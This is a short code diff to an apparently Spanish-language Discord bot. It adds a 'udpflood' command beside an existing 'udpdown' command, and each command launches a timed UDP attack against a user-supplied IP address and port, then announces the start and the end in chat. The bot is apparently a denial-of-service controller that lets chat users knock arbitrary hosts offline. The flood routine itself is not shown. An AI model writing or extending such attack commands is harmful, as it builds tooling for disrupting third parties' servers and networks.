@@ -190,6 +190,16 @@ async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
     start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
     embed = make_embed("💣 UDPDown iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
     await ctx.send(embed=embed)
+
+@bot.command(name='udpflood')
+async def udpflood_cmd(ctx, ip: str, port: int, duration: int):
+    async def notify_end():
+        embed = make_embed("✅ UDPFlood terminado", "El ataque ha finalizado", IMAGE_URLS["attack"])
+        await ctx.send(embed=embed)
+
+    start_attack("udpflood", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    embed = make_embed("💥 UDPFlood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
+    await ctx.send(embed=embed)
     
 # Ejecutar el bot
 bot.run(token)
